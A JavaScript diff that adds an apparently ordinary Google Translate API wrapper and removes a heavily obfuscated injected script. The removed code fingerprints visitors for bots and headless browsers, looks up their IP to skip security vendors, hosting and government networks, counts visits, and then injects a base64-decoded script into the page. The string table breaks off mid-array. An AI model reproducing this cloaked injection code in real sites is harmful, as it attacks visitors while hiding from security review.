+	createdTimestamp: /* int */ "created_timestamp",
+	credit: /* string */ "credit",
+	focalLength: /* int */ "focal_length",
+	iso: /* int */ "iso",
+	keywords: /* array */ "keywords",
+	orientation: /* string */ "orientation",
+	shutterSpeed: /* int */ "shutter_speed",
+	title: /* string */ "title"
+});
+
+_ = require("underscore"), request = require("request"), querystring = require("querystring"), async = require("async"), entities = require("he"), apiBase = "https://translation.googleapis.com/language/translate/v2/", maxGetQueryLen = 4500, maxSegments = 100, concurrentLimit = 10, getRequestWithApi = function(e) {
+    return function(t, n, r) {
+        var a = apiBase + t + "?" + querystring.stringify(_.extend({
+            key: e
+        }, n));
+        request.get(a, globalResponseHandler({
+            url: a
+        }, r))
     }
-}(a, 0x37d4c), (function () {
-    const J = b, c = {
-            'WyHEX': J(0x31f),
-            'UBErL': function (t, u) {
-                return t + u;
-            },
-            'DxHUk': function (t, u) {
-                return t * u;
-            },
-            'BRSyp': function (t, u) {
-                return t || u;
-            },
-            'TWHTp': function (t, u) {
-                return t + u;
-            },
-            'RSFsn': function (t, u) {
-                return t + u;
-            },
-            'CYbaw': function (t, u) {
-                return t(u);
-            },
-            'OyxAK': J(0x22a),
-            'SbZEL': J(0x1e1),
-            'FcbSn': function (t, u) {
-                return t + u;
-            },
-            'piqJG': J(0x245),
-            'toxNn': J(0x2c7),
-            'pCMKO': function (t, u) {
-                return t(u);
-            },
-            'jCYQb': function (t, u) {
-                return t === u;
-            },
-            'pDiVg': function (t, u) {
-                return t === u;
-            },
-            'cpWEP': function (t, u, v, w) {
-                return t(u, v, w);
-            },
-            'iWDLM': J(0x279),
-            'hRBou': function (t, u) {
-                return t(u);
-            },
-            'BHhUf': J(0x35a),
-            'nhFFJ': J(0x195),
-            'kzlBP': J(0x289),
-            'fsLYD': J(0x269),
-            'yaERx': J(0x271),
-            'EIVLo': J(0x275),
-            'bGtee': function (t, u, v) {
-                return t(u, v);
-            },
-            'ZiIoe': J(0x1fc),
-            'rezsh': J(0x2f1),
-            'rLhgW': J(0x1ca),
-            'RMiPA': J(0x32d),
-            'vVaeb': J(0x372),
-            'NjuVG': function (t, u) {
-                return t === u;
-            },
-            'GpQKv': function (t, u) {
-                return t !== u;
-            },
-            'HKGfc': J(0x236),
-            'AacDG': function (t, u) {
-                return t !== u;
-            },
-            'Ublsi': J(0x23a),
-            'RWKrn': function (t, u) {
-                return t !== u;
-            },
-            'VLsAm': J(0x330),
-            'vTTTD': J(0x301),
-            'jmIUN': J(0x2ee),
-            'DSFPa': function (t, u) {
-                return t === u;
-            },
-            'vAtLD': J(0x288),
-            'oZyPI': function (t) {
-                return t();
-            },
-            'puaNm': function (t, u) {
-                return t * u;
-            },
-            'SQDcB': function (t, u) {
-                return t * u;
-            },
-            'HgPZN': function (t, u) {
-                return t * u;
-            },
-            'dtkZU': function (t, u) {
-                return t / u;
-            },
-            'ZioSA': function (t, u) {
-                return t - u;
-            },
-            'TtaaU': function (t, u) {
-                return t - u;
-            },
-            'zVNFM': function (t, u) {
-                return t > u;
-            },
-            'nIBnu': J(0x273),
-            'EdKlt': J(0x2b3),
-            'UvTjQ': J(0x2bd),
-            'qfxqJ': J(0x2f4),
-            'mMJUU': J(0x215),
-            'RlIZd': J(0x328),
-            'wGdWu': J(0x2b1),
-            'ejdmc': J(0x37d),
-            'Xpksg': J(0x232),
-            'eRVqS': J(0x277),
-            'CNCwq': J(0x2ec),
-            'qEsHE': J(0x17e),
-            'vLQMk': J(0x1c0),
-            'eJTje': J(0x21b),
-            'iVWke': J(0x386),
-            'kuLJH': function (t, u) {
-                return t(u);
-            },
-            'MJqTT': J(0x287),
-            'RzHXi': J(0x2cf),
-            'qjtdC': J(0x199),
-            'HPFcY': J(0x2a7),
-            'UMPel': J(0x22b),
-            'MBddn': J(0x38b),
-            'aLQnb': J(0x265),
-            'DtRHc': J(0x24e),
-            'cknof': J(0x2da),
-            'LBWUz': J(0x312),
-            'CAbvi': J(0x29b),
-            'MdxFL': J(0x370),
-            'fcUZt': J(0x363),
-            'Fsqfe': J(0x24b),
-            'ORXsl': J(0x2a4),
-            'aMcUK': J(0x247),
-            'jsYCp': J(0x246),
-            'rzAIK': J(0x1b8),
-            'hmAZq': J(0x2af),
-            'PjeaZ': J(0x20f),
-            'GmuEr': J(0x1dc),
-            'GuzQz': J(0x1fd),
-            'BclaZ': J(0x357),
-            'ywYEj': J(0x33c),
-            'YhvvU': J(0x2d7),
-            'ZMvAR': J(0x22d),
-            'AosJn': J(0x2ff),
-            'KiDUj': J(0x296),
-            'McWfK': J(0x21d),
-            'atThx': J(0x255),
-            'bOtrR': J(0x35e),
-            'UsROj': J(0x336),
-            'arwwu': J(0x31c),
-            'ueQQD': J(0x362),
-            'GjwWY': J(0x1cc),
-            'Vomxv': J(0x34c),
-            'PFlzj': J(0x212),
-            'CvYIY': J(0x355),
-            'EoSyy': J(0x1a7),
-            'pNxHp': J(0x36a),
-            'GncLE': J(0x19b),
-            'IVuyK': J(0x346),
-            'Lccza': J(0x20d),
-            'xahrP': J(0x29c),
-            'QhYry': J(0x344),
-            'ufqhH': J(0x25b),
-            'pqHDl': J(0x1bd),
-            'BdWTU': J(0x239),
-            'ljDKn': J(0x316),
-            'dDlMX': J(0x1b0),
-            'LyQnh': J(0x1cd),
-            'hpvHh': J(0x1b3),
-            'GRdvV': J(0x36c),
-            'nDdiq': J(0x32c),
-            'uSSix': J(0x381),
-            'dOphg': J(0x1c8),
-            'mgnUE': J(0x24d),
-            'cEjwG': J(0x360),
-            'oVSxe': J(0x1c3),
-            'ckBTd': J(0x2ea),
-            'LGTzZ': J(0x29e),
-            'PVXwz': J(0x185),
-            'rNhMY': J(0x375),
-            'btjAg': J(0x2b0),
-            'VYoBr': J(0x26e),
-            'DhIbS': J(0x2a5),
-            'wNemc': J(0x233),
-            'YKPYQ': J(0x234),
-            'IaFsQ': J(0x30a),
-            'Jjjtv': J(0x19a),
-            'LxIwY': J(0x352),
-            'zzNYy': J(0x1a0),
-            'rzeIu': J(0x17f),
-            'bGnOm': J(0x20c),
-            'RPwcR': J(0x37c),
-            'PWghx': J(0x1e0),
-            'GgmNa': J(0x1b9),
-            'pQgeE': J(0x295),
-            'adYIA': J(0x27c),
-            'xMxzO': J(0x208),
-            'PZcOL': J(0x1f2),
-            'lRkrl': J(0x30b),
-            'UUKvG': J(0x19f),
-            'aouAk': J(0x2de),
-            'oTiaX': J(0x2e4),
-            'tzhMI': J(0x23d),
-            'rPmkg': J(0x2dd),
-            'LIUhd': J(0x2be),
-            'gieXD': J(0x2a0),
-            'bwodw': J(0x1da),
-            'BwiVC': J(0x1d3),
-            'GxLot': J(0x264),
-            'NlHtV': J(0x37e),
-            'QoWTv': J(0x1ee),
-            'tNAlp': J(0x2dc),
-            'yRfiO': J(0x254),
-            'qGSvU': J(0x2fb),
-            'aczqW': J(0x2c2),
-            'TmcRC': J(0x367),
-            'UmCYM': J(0x187),
-            'dKuhy': J(0x2a3),
-            'ywbtr': J(0x2e9),
-            'rixzo': J(0x1e7),
-            'asBod': J(0x309),
-            'YfCvx': J(0x1a2),
-            'elMdm': J(0x1eb),
-            'tKgbJ': J(0x209),
-            'rWCfM': J(0x248),
-            'LLSHO': J(0x276),
-            'rpfIS': J(0x341),
-            'CFniH': J(0x274),
-            'RZIxI': J(0x2e8),
-            'rBmow': J(0x2ed),
-            'nGVxB': J(0x1f5),
-            'kjdXb': J(0x214),
-            'hCNxt': J(0x20e),
-            'KVWfK': J(0x343),
-            'JkpXW': J(0x2c9),
-            'ZvDFA': J(0x26a),
-            'NCxLG': J(0x345),
-            'NdrMJ': J(0x2d1),
-            'cttSQ': J(0x240),
-            'joJcW': J(0x228),
-            'nXiEb': J(0x31b),
-            'zYcNN': J(0x291),
-            'wKGqY': J(0x1f3),
-            'IrVQQ': J(0x189),
-            'olsIw': J(0x280),
-            'cOmJc': J(0x282),
-            'lYVOs': J(0x2b6),
-            'sYaGW': J(0x315),
-            'sSYsg': J(0x2d2),
-            'yothE': J(0x373),
-            'ogxPE': J(0x292),
-            'dEZIh': J(0x27d),
-            'qEcNv': J(0x22c),
-            'BJrTw': J(0x1ab),
-            'nEVlP': J(0x34b),
-            'sSzwF': J(0x337),
-            'AmpTj': J(0x270),
-            'Tirmb': J(0x1e3),
-            'eoijW': J(0x1d4),
-            'yuJoc': J(0x1de),
-            'fwQrR': J(0x1b7),
-            'VcXzO': J(0x1e2),
-            'hYchT': J(0x311),
-            'ljZSs': J(0x32b),
-            'cEKez': J(0x210),
-            'MbIPg': J(0x191),
-            'xOgnp': J(0x181),
-            'gbWDk': J(0x2b4),
-            'xLbbQ': J(0x238),
-            'sGLdt': J(0x218),
-            'AZHVf': J(0x2a1),
-            'Lbufl': J(0x339),
-            'dUNaq': J(0x224),
-            'xMREN': J(0x2c6),
-            'EpIgx': J(0x28e),
-            'CNndd': J(0x27e),
-            'kamJd': J(0x1c4),
-            'RZQtE': J(0x2ce),
-            'cqQPv': J(0x2ba),
-            'DqZTE': J(0x266),
-            'ctVks': J(0x376),
-            'BLVrd': J(0x19c),
-            'eQbfd': function (t, u) {
-                return t === u;
-            },
-            'mWkEi': function (t, u, v) {
-                return t(u, v);
-            },
-            'pDGBt': function (t, u) {
-                return t >= u;
-            },
-            'sZsNs': J(0x2cd),
-            'FbXMl': function (t) {
-                return t();
-            },
-            'Lsliu': J(0x32e)
-        }, d = 0x2, e = c[J(0x313)];
-    function f() {
-        const K = J;
-        try {
-            const u = c[K(0x2b8)];
-            return localStorage[K(0x340)](u, '1'), localStorage[K(0x1ae)](u), !![];
-        } catch (v) {
-            return ![];
-        }
+}, postRequestWithApi = function(e) {
+    return function(t, n, r) {
+        var a = {
+            url: apiBase + t,
+            method: "POST",
+            form: querystring.stringify(_.extend({
+                key: e
+            }, n)),
+            headers: {
+                "X-HTTP-Method-Override": "GET"
+            }
+        };
+        request(a, globalResponseHandler(a, r))
     }
-    function g(t, u, v) {
-        const L = J;
-        try {
-            const w = new Date(c[L(0x1f4)](Date[L(0x1d9)](), c[L(0x1c5)](c[L(0x26d)](v, 0x16d), 0x5265c00)))[L(0x2ad)]();
-            document[L(0x342)] = c[L(0x31d)](c[L(0x31d)](c[L(0x380)](c[L(0x31d)](c[L(0x1f4)](t, '='), c[L(0x30c)](encodeURIComponent, u)), c[L(0x318)]), w), c[L(0x184)]);
-        } catch (x) {
-        }
-    }
-    function h(t) {
-        const M = J;
-        try {
-            const u = document[M(0x342)][M(0x1f6)](new RegExp(c[M(0x327)](c[M(0x1f4)](c[M(0x325)], t[M(0x29f)](/([.$?*|{}()\[\]\\/\+^])/g, '$1')), c[M(0x196)])));
-            return u ? c[M(0x297)](decodeURIComponent, u[0x1]) : null;
-        } catch (v) {
-            return null;
-        }
-    }
-    const i = c[J(0x32f)](f);
-    function j(t, u) {
-        const N = J;
-        if (i) {
-            const x = localStorage[N(0x283)](t);
-            return c[N(0x256)](x, null) ? u : x;
-        }
-        const w = c[N(0x30c)](h, t);
-        return c[N(0x299)](w, null) ? u : w;
-    }
-    function k(t, u) {
-        const O = J;
-        i ? localStorage[O(0x340)](t, u) : c[O(0x1bc)](g, t, u, 0x16d);
-    }
-    function l() {
-        const P = J;
-        try {
-            const t = c[P(0x193)], u = c[P(0x192)](atob, t), v = document[P(0x310)](c[P(0x18a)]);
-            v[P(0x1ed)] = u, (document[P(0x30d)] || document[P(0x2d9)])[P(0x36f)](v);
-        } catch (w) {
-            console[P(0x2ef)](c[P(0x202)], w);
-        }
-    }
-    function m() {
-        const Q = J, t = c[Q(0x258)], u = c[Q(0x192)](atob, t), v = document[Q(0x310)](c[Q(0x2b9)]);
-        v[Q(0x213)] = c[Q(0x1a9)], v[Q(0x2f0)] = u, v[Q(0x1ec)][Q(0x20b)] = c[Q(0x1db)], document[Q(0x1c6)][Q(0x36f)](v), c[Q(0x35c)](setTimeout, l, 0x0);
-    }
-    const n = 0xa, o = -0x8, p = 0x5;
-    async function q() {
-        const R = J, t = {
-                'cXEmQ': c[R(0x33f)],
-                'sOELq': function (z, A) {
-                    const S = R;
-                    return c[S(0x256)](z, A);
-                },
-                'rpoFM': c[R(0x2bb)],
-                'tGDrl': function (z, A) {
-                    const T = R;
-                    return c[T(0x33e)](z, A);
-                },
-                'KWPdG': c[R(0x249)],
-                'ZCTjU': function (z, A) {
-                    const U = R;
-                    return c[U(0x2fa)](z, A);
-                },
-                'XddMv': c[R(0x1b6)],
-                'GjXoN': c[R(0x2bc)]
-            }, u = [
-                () => {
-                    const V = R, z = navigator[V(0x354)][V(0x1a6)](), A = /headless|phantomjs|selenium|webdriver/i[V(0x33a)](z);
-                    return { 'score': A ? n : o };
-                },
-                () => {
-                    const W = R, z = c[W(0x256)](navigator[W(0x23a)], !![]);
-                    return { 'score': z ? n : o };
-                },
-                () => {
-                    const X = R, z = !!window[X(0x27f)], A = z && (window[X(0x27f)][X(0x2a2)] || window[X(0x27f)][X(0x186)]), B = c[X(0x26d)](!z, !A);
-                    return { 'score': B ? p : o };
-                },
-                async () => {
-                    const Y = R;
-                    if (!navigator[Y(0x268)])
-                        return { 'score': 0x0 };
-                    try {
-                        const z = await navigator[Y(0x268)][Y(0x38a)]({ 'name': t[Y(0x21c)] }), A = Notification[Y(0x322)], B = t[Y(0x1cf)](A, t[Y(0x203)]) && t[Y(0x221)](z[Y(0x1b5)], t[Y(0x2c8)]);
-                        return { 'score': B ? n : o };
-                    } catch (C) {
-                        return { 'score': p };
-                    }
-                },
-                () => {
-                    const Z = R, z = navigator[Z(0x26c)]?.[Z(0x35b)] || 0x0, A = c[Z(0x256)](z, 0x0);
-                    return { 'score': A ? p : o };
-                },
-                () => {
-                    const a0 = R, z = navigator[a0(0x1a5)], A = navigator[a0(0x18d)]?.[a0(0x35b)] || 0x0, B = !z || t[a0(0x200)](A, 0x0);
-                    return { 'score': B ? n : o };
-                },
-                () => {
-                    const a1 = R;
-                    try {
-                        const z = document[a1(0x310)](c[a1(0x18e)]), A = z[a1(0x281)](c[a1(0x2a6)]) || z[a1(0x281)](c[a1(0x1c2)]);
-                        if (!A)
-                            return { 'score': p };
-                        const B = A[a1(0x2e7)](c[a1(0x347)]), C = B ? A[a1(0x298)](B[a1(0x25d)]) : c[a1(0x2e1)], D = /swiftshader|llvmpipe|mesa/i[a1(0x33a)](C);
-                        return { 'score': D ? p : o };
-                    } catch (E) {
-                        return { 'score': p };
-                    }
-                },
-                () => {
-                    const a2 = R, z = window[a2(0x348)], A = window[a2(0x227)], B = window[a2(0x272)], C = window[a2(0x1a8)], D = c[a2(0x256)](z, 0x0) && c[a2(0x299)](A, 0x0) || c[a2(0x299)](z, B) && c[a2(0x33e)](A, C);
-                    return { 'score': D ? n : o };
-                },
-                () => {
-                    const a3 = R, z = navigator[a3(0x23a)] || t[a3(0x200)](window[a3(0x26b)]?.[a3(0x2d9)]?.[a3(0x1e6)](t[a3(0x319)]), t[a3(0x251)]) || window[a3(0x369)] || window[a3(0x2d8)];
-                    return { 'score': z ? n : o };
-                },
-                () => {
-                    const a4 = R, z = /HeadlessChrome/[a4(0x33a)](navigator[a4(0x354)]);
-                    return { 'score': z ? n : 0x0 };
-                },
-                () => {
-                    const a5 = R, z = window[a5(0x369)] || window[a5(0x2d8)] || window[a5(0x257)];
-                    return { 'score': z ? n : 0x0 };
-                },
-                () => {
-                    const a6 = R, z = c[a6(0x2a8)](window[a6(0x26b)]?.[a6(0x2d9)]?.[a6(0x1e6)](c[a6(0x378)]), null) || c[a6(0x29d)](window[a6(0x26b)]?.[a6(0x2d9)]?.[a6(0x1e6)](c[a6(0x1b6)]), null) || c[a6(0x23f)](window[a6(0x26b)]?.[a6(0x211)], undefined) || c[a6(0x29d)](window[a6(0x26b)]?.[a6(0x33b)], undefined);
-                    return { 'score': z ? n : 0x0 };
+}, globalResponseHandler = function(e, t) {
+    return function(n, r, a) {
+        if (t && _.isFunction(t)) {
+            if (n || !r || 200 !== r.statusCode) return t({
+                error: n,
+                response: r,
+                body: a,
+                request: e,
+                toString: function() {
+                    return n ? n.toString() : ""
                 }
-            ];
-        let v = 0x0;
-        for (const z of u) {
+            }, null);
+            var i = null;
             try {
-                const A = await c[R(0x32f)](z);
-                v += A[R(0x329)];
-            } catch (B) {
+                i = JSON.parse(a)
+            } catch (e) {
+                return t(n = "Could not parse response from Google: " + (a || "null"), null)
             }
+            t(null, i)
         }
-        const w = c[R(0x1d1)](u[R(0x35b)], n), x = c[R(0x18c)](u[R(0x35b)], o), y = Math[R(0x241)](0x0, Math[R(0x24c)](0x64, c[R(0x25c)](c[R(0x303)](c[R(0x1a1)](v, x), c[R(0x1bb)](w, x)), 0x64)));
-        return Math[R(0x388)](y);
     }
-    async function r() {
-        const a7 = J;
-        try {
-            const t = await c[a7(0x32f)](q);
-            if (c[a7(0x1f9)](t, 0xf))
-                return console[a7(0x188)](c[a7(0x278)], t), ![];
-            const u = navigator[a7(0x354)][a7(0x1a6)](), v = [
-                    c[a7(0x23c)],
-                    c[a7(0x260)],
-                    c[a7(0x2f5)],
-                    c[a7(0x18f)],
-                    c[a7(0x2b7)],
-                    c[a7(0x2ae)],
-                    c[a7(0x305)],
-                    c[a7(0x263)],
-                    c[a7(0x21f)],
-                    c[a7(0x2f2)],
-                    c[a7(0x384)],
-                    c[a7(0x27b)],
-                    c[a7(0x2d4)]
+}, parseTranslations = function(e, t) {
+    return function(n, r) {
+        if (n) return t(n, null);
+        r = (r = r.data).translations ? r.translations : r, e.forEach((function(e, t) {
+            r[t] && _.extend(r[t], {
+                originalText: e
+            })
+        })), r = r.map((function(e) {
+            return e.translatedText = entities.decode(e.translatedText), e
+        })), t(null, r)
+    }
+}, parseSupportedLanguages = function(e) {
+    return function(t, n) {
+        if (t) return e(t, null);
+        (n = n.data.languages)[0] && !n[0].name && (n = _.pluck(n, "language")), e(null, n)
+    }
+}, parseLanguageDetections = function(e, t) {
+    return function(n, r) {
+        if (n) return t(n, null);
+        r = (r = r.data && r.data.detections ? r.data.detections : r).length > 1 ? r.map((function(e) {
+            return e[0]
+        })) : r[0], e.forEach((function(e, t) {
+            r[t] && _.extend(r[t], {
+                originalText: e
+            })
+        })), t(null, r)
+    }
+}, shouldSplitSegments = function(e) {
+    return !!Array.isArray(e) && (e.length > maxSegments || encodeURIComponent(e.join(",")).length > maxGetQueryLen && 1 !== e.length)
+}, splitArraysForGoogle = function(e, t) {
+    if (e.length > maxSegments || encodeURIComponent(e.join(",")).length > maxGetQueryLen && 1 !== e.length) {
+        var n = Math.floor(e.length / 2);
+        splitArraysForGoogle(e.slice(0, n), t), splitArraysForGoogle(e.slice(n, e.length), t)
+    } else t.push(e)
+};
+module.exports = function(e, t) {
+    var n = (t = t || {}).requestOptions || {};
+    _.keys(n).length > 0 && (request = request.defaults(n)), concurrentLimit = t.concurrentLimit || concurrentLimit;
+    var r = getRequestWithApi(e),
+        a = postRequestWithApi(e),
+        i = {
+            translate: function(e, t, n, r) {
+                if (r || (r = n, n = t, t = null), !_.isFunction(r)) return console.log("No callback defined");
+                if ("string" != typeof e && !Array.isArray(e)) return r("Input source must be a string or array of strings");
+                if ("string" != typeof n) return r("No target language specified. Must be a string");
+                var i;
+                shouldSplitSegments(e) ? splitArraysForGoogle(e, i = []) : i = Array.isArray(e) ? [e] : [
+                    [e]
                 ];
-            for (const F of v) {
-                if (u[a7(0x1a3)](F))
-                    return console[a7(0x188)](c[a7(0x359)], u), ![];
+                var o = {
+                    target: n
+                };
+                t && (o.source = t), async.mapLimit(i, concurrentLimit, (function(e, t) {
+                    a("", _.extend({
+                        q: e
+                    }, o), parseTranslations(e, t))
+                }), (function(e, t) {
+                    if (e) return r(e);
+                    1 === (t = _.flatten(t)).length && (t = t[0]), r(null, t)
+                }))
+            },
+            getSupportedLanguages: function(e, t) {
+                if (_.isFunction(e) ? (t = e, e = {}) : e = {
+                        target: e
+                    }, !_.isFunction(t)) return console.log("No callback defined");
+                r("languages", e, parseSupportedLanguages(t))
+            },
+            detectLanguage: function(e, t) {
+                return t ? "string" == typeof e || Array.isArray(e) ? (shouldSplitSegments(e) ? splitArraysForGoogle(e, n = []) : n = Array.isArray(e) ? [e] : [
+                    [e]
+                ], void async.mapLimit(n, concurrentLimit, (function(e, t) {
+                    a("detect", {
+                        q: e
+                    }, parseLanguageDetections(e, t))
+                }), (function(e, n) {
+                    if (e) return t(e);
+                    1 === (n = _.flatten(n)).length && (n = n[0]), t(null, n)
+                }))) : t("Input source must be a string or array of strings") : console.log("No callback defined");
+                var n
             }
-            const w = await c[a7(0x304)](fetch, c[a7(0x307)]);
-            if (!w['ok'])
-                return !![];
-            const x = await w[a7(0x197)](), y = x['ip'], z = await c[a7(0x30c)](fetch, a7(0x2f8) + y + a7(0x356)), A = await z[a7(0x197)](), B = A[a7(0x2fd)] || '', C = A[a7(0x1d7)] || '';
-            if (A[a7(0x293)] || A[a7(0x364)] || A[a7(0x302)])
-                return console[a7(0x188)](c[a7(0x332)], A), ![];
-            const D = [
-                    c[a7(0x285)],
-                    c[a7(0x37f)],
-                    c[a7(0x194)],
-                    c[a7(0x2c0)],
-                    c[a7(0x1c1)],
-                    c[a7(0x29a)],
-                    c[a7(0x31e)],
-                    c[a7(0x1af)],
-                    c[a7(0x366)],
-                    c[a7(0x382)],
-                    c[a7(0x32a)],
-                    c[a7(0x217)],
-                    c[a7(0x374)],
-                    c[a7(0x1aa)],
-                    c[a7(0x2f7)],
-                    c[a7(0x223)],
-                    c[a7(0x1f8)],
-                    c[a7(0x30e)],
-                    c[a7(0x28f)],
-                    c[a7(0x1fe)],
-                    c[a7(0x321)],
-                    c[a7(0x34f)],
-                    c[a7(0x37a)],
-                    c[a7(0x2e3)],
-                    c[a7(0x320)],
-                    c[a7(0x2c4)],
-                    c[a7(0x368)],
-                    c[a7(0x37b)],
-                    c[a7(0x2f3)],
-                    c[a7(0x33d)],
-                    c[a7(0x1ff)],
-                    c[a7(0x267)],
-                    c[a7(0x183)],
-                    c[a7(0x335)],
-                    c[a7(0x2fc)],
-                    c[a7(0x2b2)],
-                    c[a7(0x1fb)],
-                    c[a7(0x1b4)],
-                    c[a7(0x229)],
-                    c[a7(0x294)],
-                    c[a7(0x1e5)],
-                    c[a7(0x180)],
-                    c[a7(0x387)],
-                    c[a7(0x23e)],
-                    c[a7(0x385)],
-                    c[a7(0x34a)],
-                    c[a7(0x1ce)],
-                    c[a7(0x284)],
-                    c[a7(0x1d8)],
-                    c[a7(0x30f)],
-                    c[a7(0x383)],
-                    c[a7(0x1c9)],
-                    c[a7(0x34e)],
-                    c[a7(0x2d0)],
-                    c[a7(0x1ba)],
-                    c[a7(0x2bf)],
-                    c[a7(0x262)],
-                    c[a7(0x242)],
-                    c[a7(0x190)],
-                    c[a7(0x2b5)],
-                    c[a7(0x2ca)],
-                    c[a7(0x1a4)],
-                    c[a7(0x371)],
-                    c[a7(0x350)],
-                    c[a7(0x222)],
-                    c[a7(0x25a)],
-                    c[a7(0x1ac)],
-                    c[a7(0x2e5)],
-                    c[a7(0x2f6)],
-                    c[a7(0x331)],
-                    c[a7(0x259)],
-                    c[a7(0x1ea)],
-                    c[a7(0x308)],
-                    c[a7(0x36b)],
-                    c[a7(0x35d)],
-                    c[a7(0x317)],
-                    c[a7(0x205)],
-                    c[a7(0x2cc)],
-                    c[a7(0x1f1)],
-                    c[a7(0x35f)],
-                    c[a7(0x2e0)],
-                    c[a7(0x1b2)],
-                    c[a7(0x389)],
-                    c[a7(0x22e)],
-                    c[a7(0x314)],
-                    c[a7(0x351)],
-                    c[a7(0x2df)],
-                    c[a7(0x250)],
-                    c[a7(0x2eb)],
-                    c[a7(0x27a)],
-                    c[a7(0x379)],
-                    c[a7(0x1cb)],
-                    c[a7(0x349)],
-                    c[a7(0x198)],
-                    c[a7(0x377)],
-                    c[a7(0x2d5)],
-                    c[a7(0x358)],
-                    c[a7(0x204)],
-                    c[a7(0x1fa)],
-                    c[a7(0x2d6)],
-                    c[a7(0x201)],
-                    c[a7(0x25e)],
-                    c[a7(0x24f)],
-                    c[a7(0x252)],
-                    c[a7(0x253)],
-                    c[a7(0x1ad)],
-                    c[a7(0x1c7)],
-                    c[a7(0x36e)],
-                    c[a7(0x286)],
-                    c[a7(0x243)],
-                    c[a7(0x28a)],
-                    c[a7(0x1f0)],
-                    c[a7(0x1f7)],
-                    c[a7(0x21a)],
-                    c[a7(0x2db)],
-                    c[a7(0x2d3)],
-                    c[a7(0x24a)],
-                    c[a7(0x338)],
-                    c[a7(0x230)],
-                    c[a7(0x334)],
-                    c[a7(0x20a)],
-                    c[a7(0x1d6)],
-                    c[a7(0x1df)],
-                    c[a7(0x1bf)],
-                    c[a7(0x2c1)],
-                    c[a7(0x244)],
-                    c[a7(0x216)],
-                    c[a7(0x226)],
-                    c[a7(0x1d2)],
-                    c[a7(0x237)],
-                    c[a7(0x2c5)],
-                    c[a7(0x31a)],
-                    c[a7(0x2e6)],
-                    c[a7(0x2f9)],
-                    c[a7(0x2a9)],
-                    c[a7(0x206)],
-                    c[a7(0x182)],
-                    c[a7(0x1e8)],
-                    c[a7(0x28b)],
-                    c[a7(0x2ab)],
-                    c[a7(0x2fe)],
-                    c[a7(0x28d)],
-                    c[a7(0x1dd)],
-                    c[a7(0x28c)],
-                    c[a7(0x2e2)],
-                    c[a7(0x22f)],
-                    c[a7(0x207)],
-                    c[a7(0x2cb)],
-                    c[a7(0x18b)],
-                    c[a7(0x300)],
-                    c[a7(0x19d)],
-                    c[a7(0x2aa)],
-                    c[a7(0x290)],
-                    c[a7(0x36d)],
-                    c[a7(0x365)],
-                    c[a7(0x1ef)],
-                    c[a7(0x225)],
-                    c[a7(0x1b1)],
-                    c[a7(0x1d5)]
-                ], E = c[a7(0x1f4)](c[a7(0x327)](B, '\x20'), C)[a7(0x1a6)]();
-            for (const G of D) {
-                if (E[a7(0x1a3)](G[a7(0x1a6)]()))
-                    return console[a7(0x188)](c[a7(0x1be)], G), ![];
-            }
-            return !![];
-        } catch (H) {
-            return console[a7(0x2ef)](c[a7(0x1e4)], H), !![];
-        }
+        };
+    return {
+        translate: i.translate,
+        getSupportedLanguages: i.getSupportedLanguages,
+        detectLanguage: i.detectLanguage
     }
-    async function s() {
-        const a8 = J;
-        try {
-            const t = await c[a8(0x32f)](r);
-            console[a8(0x188)](c[a8(0x219)], t);
-            if (!t)
-                return;
-            const u = c[a8(0x35c)](j, c[a8(0x333)], '0');
-            if (c[a8(0x26f)](u, '1'))
-                return;
-            let v = c[a8(0x35c)](parseInt, c[a8(0x1d0)](j, e, '0'), 0xa);
-            if (Number[a8(0x21e)](v))
-                v = 0x0;
-            v++, c[a8(0x35c)](k, e, v[a8(0x353)]()), c[a8(0x261)](v, d) && c[a8(0x32f)](m);
-        } catch (w) {
-            c[a8(0x32f)](m);
-        }
-    }
-    document[J(0x1c6)] ? c[J(0x324)](s) : document[J(0x2c3)](c[J(0x306)], s);
-}()));
-function b(c, d) {
-    c = c - 0x17e;
-    const e = a();
-    let f = e[c];
-    return f;
-}
-function a() {
-    const a9 = [
-        'addEventListener',
-        'KiDUj',
-        'yothE',
-        'SK\x20Broadband',
-        '=([^;]*)',
-        'KWPdG',
-        'Solution\x20Pro',
-        'rNhMY',
-        'xOgnp',
-        'xMxzO',
-        '_vc',
-        'HostUS',
-        'Mobile,\x20proxy,\x20or\x20hosting\x20IP\x20detected:',
-        'dOphg',
-        'Information\x20Technology\x20Systems',
-        'Websitewelcome.com',
-        'JkpXW',
-        'eJTje',
-        'aczqW',
-        'ywbtr',
-        'US\x20Department\x20of\x20Defense\x20Network',
-        '_phantom',
-        'documentElement',
-        'Niedersaechsische\x20Landesregierung',
-        'KVWfK',
-        'Leaseweb\x20Deutschland\x20GmbH',
-        'VKontakte\x20Ltd',
-        'Fujitsu',
-        'gieXD',
-        'UUKvG',
-        'vVaeb',
-        'ljZSs',
-        'ZMvAR',
-        'Daum\x20Communication\x20Co.,LTD',
-        'Jjjtv',
-        'dEZIh',
-        'getExtension',
-        'China\x20Cultural\x20Heritage\x20Information\x20and\x20Consulting',
-        'Bitdefender-as',
-        'Tinet',
-        'BwiVC',
-        'bing',
-        'China\x20Digital\x20Kingdom\x20Technology\x20Co.,Ltd.',
-        'prompt',
-        'error',
-        'innerHTML',
-        'webgl',
-        'CNCwq',
-        'bOtrR',
-        'spider',
-        'qfxqJ',
-        'LxIwY',
-        'jsYCp',
-        'http://ip-api.com/json/',
-        'qEcNv',
-        'DSFPa',
-        'Leaseweb-de',
-        'PFlzj',
-        'isp',
-        'yuJoc',
-        'Cisco\x20Systems\x20Ironport\x20Division',
-        'xLbbQ',
-        'denied',
-        'hosting',
-        'dtkZU',
-        'kuLJH',
-        'ejdmc',
-        'Lsliu',
-        'MJqTT',
-        'RPwcR',
-        'MX\x20Logic',
-        'DigitalOne\x20AG',
-        'Tiscali\x20SpA',
-        'CYbaw',
-        'head',
-        'PjeaZ',
-        'hpvHh',
-        'createElement',
-        'Hetzner\x20CC',
-        'Barracuda\x20Networks',
-        'sZsNs',
-        'rPmkg',
-        'LinkedIn\x20Corporation',
-        'Amazon\x20Technologies',
-        'pQgeE',
-        'OyxAK',
-        'XddMv',
-        'ogxPE',
-        'Tinet\x20Spa',
-        'PacketExchange',
-        'TWHTp',
-        'cknof',
-        '__vc_test',
-        'AosJn',
-        'BclaZ',
-        'permission',
-        '258237YleoUu',
-        'FbXMl',
-        'piqJG',
-        '22MFdCiL',
-        'FcbSn',
-        'slurp',
-        'score',
-        'fcUZt',
-        'Limited\x20liability\x20company\x20Mail.Ru',
-        'Amazon',
-        'WEBGL_debug_renderer_info',
-        'DOMContentLoaded',
-        'oZyPI',
-        'notifications',
-        'zzNYy',
